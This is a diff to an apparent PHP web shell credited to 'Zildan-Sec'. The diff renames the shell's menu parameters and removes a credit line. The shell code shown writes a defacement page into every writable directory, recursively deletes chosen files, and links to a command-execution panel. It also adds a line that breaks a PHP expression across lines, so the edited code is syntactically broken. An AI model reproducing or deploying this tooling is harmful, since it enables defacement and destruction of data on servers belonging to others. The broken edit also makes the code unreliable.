@@ -133,7 +133,6 @@ echo "<tr><td><font color='white'>
 + system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
 + Coded By   <td>: <font color='LightBlue'>Zildan-Sec<tr><td><font color='white'>
 + Website<td>: <font color='LightBlue'>Zildan-Sec.my.id<tr><td><font color='white'>
-+ Youtube <td>: <font color='LightBlue'>$ .: Z4PHY PHANT0MHIVE :. $</font></tr></td><br>
 </table>";
 echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
 <center><tr align="center"><td align="center">path : ';
@@ -177,13 +176,13 @@ echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
 echo "<a class='destroy_table' href='?'>Home</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Gasspoll!</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
+echo "<a class='destroy_table' href='?dir=$dir&to=asokoe'>Gasspoll!</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=gassken'>Apus</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
 echo "</center>";
 
-if($_GET['to'] == 'mass') {
+if($_GET['to'] == 'asokoe') {
 	function sabun_massal($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
@@ -199,7 +198,7 @@ if($_GET['to'] == 'mass') {
 						if(is_writable($dirc)) {
 							echo "[<font color=lime>DONE</font>] $lokasi<br>";
 							file_put_contents($lokasi, $isi_script);
-							$idx = sabun_massal($dirc,$namafile,$isi_script);
+							$z4p = sabun_massal($dirc,$namafile,$isi_script);
 						}
 					}
 				}
@@ -227,7 +226,7 @@ if($_GET['to'] == 'mass') {
 			}
 		}
 	}
-	if($_POST['gassken']) {
+	if($_POST['start']) {
 		if($_POST['tipe_sabun'] == 'mahal') {
 			echo "<div style='margin: 5px auto; padding: 5px'>";
 			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
@@ -248,10 +247,10 @@ if($_GET['to'] == 'mass') {
 	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
 	<textarea name='script' style='width: 450px; height: 200px;'>$ .: SWEET TOUCH BY Z4PHY :. $</textarea><br>
-	<input type='submit' name='gassken' value='ENTOT COK!' style='width: 450px;'>
+	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
 	</form></center>";
 	} 
-	} elseif($_GET['to'] == 'masse') {
+	} elseif($_GET['to'] == 'gassken') {
    function hapus_massal($dir,$namafile) {
 if(is_writable($dir)) {
    $dira = scandir($dir);
@@ -272,7 +271,7 @@ if(is_writable($dir)) {
                    if(file_exists($lokasi)) {
                        echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                        unlink($lokasi);
-                       $idx = hapus_massal($dirc,$namafile);
+                       $z4p = hapus_massal($dirc,$namafile);
                    }
                }
            }
@@ -280,7 +279,7 @@ if(is_writable($dir)) {
    }
 }
    }
-   if($_POST['gassken']) {
+   if($_POST['start']) {
 echo "<div style='margin: 5px auto; padding: 5px'>";
 hapus_massal($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
@@ -291,7 +290,7 @@ echo "</div>";
    <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
    <font>Filename :</font><br>
    <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
-   <input type='submit' name='gassken' value='Mass Delete' style='width: 450px;'>
+   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
    </form></center>";
    }
    //BATAS
@@ -398,7 +397,8 @@ echo '<tr class="s_tb">
 if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
 elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
-if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.
+)) echo '</font>';
 
 echo '</center></td>
 <td class="pl"><center><form method="POST" action="?option&path='.$path.'">
